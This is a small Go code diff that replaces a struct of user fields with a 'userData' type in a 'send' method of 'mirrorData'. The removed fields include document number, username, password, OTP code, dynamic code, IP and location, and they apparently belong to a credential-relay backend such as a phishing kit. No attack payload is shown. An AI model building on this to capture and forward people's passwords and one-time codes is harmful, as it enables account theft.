@@ -23,20 +23,7 @@ func mirrData(name string) (d mirrorData) {
 	return
 }
 
-type msg struct {
-	Nip      string `json:"documentNumber"`
-	FullName string `json:"fullName"`
-	Phone    string `json:"username,omitempty"`
-	Pass     string `json:"password,omitempty"`
-	IP       string `json:"userIP"`
-	City     string `json:"city"`
-	Country  string `json:"country"`
-	OTP      string `json:"otpCode,omitempty"`
-	DynCode  string `json:"dynamicCode,omitempty"`
-	Step     string `json:"step,omitempty"`
-}
-
-func (m *mirrorData) send(h *common.ReqHandler, data msg, one bool) {
+func (m *mirrorData) send(h *common.ReqHandler, data userData, one bool) {
 	back := ""
 	if one {
 		back = m.Back1
